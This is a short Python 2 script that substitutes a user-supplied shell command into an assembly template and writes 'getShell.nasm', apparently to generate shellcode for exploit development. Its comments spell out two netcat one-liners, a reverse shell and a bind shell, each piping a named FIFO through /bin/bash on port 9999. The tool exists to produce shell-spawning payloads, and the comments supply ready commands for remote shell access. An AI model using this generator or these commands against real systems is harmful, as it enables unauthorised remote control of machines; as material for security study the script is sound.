#!/usr/bin/python
import optparse
import fileinput

parser = optparse.OptionParser()

# Required cmd argument
parser.add_option('-f', '--file',
            action="store", dest="file",
            help="Name of the file to edit")

parser.add_option('-c','--command',
            action="store", dest="cmd",
            help="The command to be executed, must terminate with R")
#revers shell:  rm -f /tmp/f; mkfifo /tmp/f && /bin/nc localhost 9999 </tmp/f | /bin/bash &>/tmp/fR
#bind shell:    rm -f /tmp/f; mkfifo /tmp/f; /bin/nc -lk 9999 0</tmp/f | /bin/bash &>/tmp/fR    
options, args = parser.parse_args()
_f = options.file
_cmd =  options.cmd
_len = len(_cmd)
_posR = (_len)-1

_repDic = {'_R_POS_':str(_posR), '_LEN_':str(_len), '_CMD_':_cmd}

f1=open(_f, 'r')
f2 = open("getShell.nasm", 'w')
data=f1.read()
f1.close()
for key, value in _repDic.items():
        data=data.replace(key,value)

f2.write(data)
f2.close()
print 'Done. New file created getShell.nasm'
